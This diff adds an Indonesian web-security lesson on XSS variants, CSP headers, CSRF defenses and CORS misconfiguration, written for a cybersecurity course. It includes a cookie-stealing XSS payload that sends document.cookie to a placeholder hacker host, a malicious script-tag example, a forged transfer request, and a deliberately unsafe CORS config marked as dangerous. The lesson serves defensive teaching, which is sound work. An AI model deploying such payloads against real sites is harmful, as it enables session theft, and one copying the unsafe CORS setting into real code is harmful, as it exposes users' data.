@@ -1,0 +1,80 @@
+---
+title: "OWASP Top 10: Penanganan Cross-Site Scripting (XSS), CSRF & Header CSP"
+courseSlug: "cybersecurity-web-defense"
+chapter: "Bab 2: Eksploitasi & Pertahanan OWASP Top 10"
+order: 4
+duration: "35 Menit"
+contentType: "text"
+---
+
+import Callout from '../../components/mdx/Callout.astro';
+
+Serangan di sisi klien web (*Client-Side Attacks*) mengeksploitasi kepercayaan peramban terhadap skrip yang dijalankan di sebuah domain web. Dua serangan klien paling legendaris adalah **Cross-Site Scripting (XSS)** dan **Cross-Site Request Forgery (CSRF)**.
+
+---
+
+## 1. Tiga Varian Cross-Site Scripting (XSS)
+
+XSS terjadi ketika penyerang berhasil menyuntikkan skrip JavaScript berbahaya ke dalam halaman web yang dilihat oleh pengguna lain:
+
+1. **Stored XSS (Paling Berbahaya)**: Skrip berbahaya tersimpan di basis data (misal di kolom komentar artikel) dan dieksekusi setiap kali ada pengguna yang membuka halaman tersebut.
+2. **Reflected XSS**: Skrip dikirim melalui parameter URL (misal: `https://site.com/search?q=<script>...`) dan dipantulkan kembali di halaman hasil pencarian.
+3. **DOM-based XSS**: Kerentanan terjadi murni di JavaScript frontend karena penggunaan fungsi berbahaya seperti `element.innerHTML = userInput` atau `eval()`.
+
+```text
+// Contoh Payload XSS Pencuri Sesi:
+<script>
+  fetch('https://hacker-server.com/steal?cookie=' + encodeURIComponent(document.cookie));
+</script>
+```
+
+### Strategi Pertahanan XSS:
+- **Output Encoding / Sanitasi**: Gunakan pustaka seperti `DOMPurify` dan hindari `innerHTML` (gunakan `textContent` atau framework reaktif modern yang otomatis melakukan escaping).
+- **HttpOnly Cookies**: Simpan token otentikasi di cookie `HttpOnly` agar tidak bisa dibaca oleh skrip JavaScript peramban sama sekali.
+- **Content Security Policy (CSP)**: Header HTTP yang membatasi dari domain mana saja skrip boleh dimuat.
+
+---
+
+## 2. Content Security Policy (CSP) Header
+
+Header CSP bertindak sebagai daftar putih (*allowlist*) sumber daya yang diizinkan dieksekusi di peramban:
+
+```http
+Content-Security-Policy: default-src 'self'; script-src 'self' https://trusted-cdn.com; object-src 'none'; frame-ancestors 'none';
+```
+Dengan header di atas, jika hacker berhasil menyuntikkan tag `<script src="https://hacker.com/malware.js">`, browser akan **otomatis memblokir** pengunduhan skrip tersebut!
+
+---
+
+## 3. Cross-Site Request Forgery (CSRF) & SameSite Cookie
+
+CSRF memaksa peramban korban yang sedang login untuk mengirimkan permintaan transaksi tanpa sepengetahuannya (misal membuka link gambar di forum hacker yang memicu `POST /api/transfer?to=hacker&amount=1000000`).
+
+### Solusi Pertahanan CSRF:
+1. **Atribut Cookie `SameSite=Strict` atau `SameSite=Lax`**: Memastikan cookie sesi tidak dikirim jika permintaan berasal dari domain situs pihak ketiga (*Cross-Origin*).
+2. **Anti-CSRF Tokens**: Token acak kriptografis unik yang disertakan di form HTML dan divalidasi oleh backend pada setiap mutasi data (`POST`, `PUT`, `DELETE`).
+
+---
+
+## 4. Bahaya Salah Konfigurasi CORS (Cross-Origin Resource Sharing)
+
+```javascript
+// ❌ KONFIGURASI SANGAT BERBAHAYA:
+// Mengizinkan semua website membaca data rahasia user dengan credentials
+app.use(cors({
+  origin: true, // atau origin: '*'
+  credentials: true
+}));
+
+// ✅ KONFIGURASI AMAN:
+app.use(cors({
+  origin: ['https://app.domainresmi.com', 'https://admin.domainresmi.com'],
+  credentials: true,
+  methods: ['GET', 'POST', 'PUT', 'DELETE'],
+  allowedHeaders: ['Content-Type', 'Authorization']
+}));
+```
+
+<Callout type="tip" title="Paket Helmet untuk Express.js">
+  Pada aplikasi backend Express.js, pasang middleware `helmet()` di baris paling atas untuk secara otomatis mengaktifkan kumpulan security headers standar industri (`X-Frame-Options`, `X-Content-Type-Options`, `Strict-Transport-Security`, dan CSP).
+</Callout>
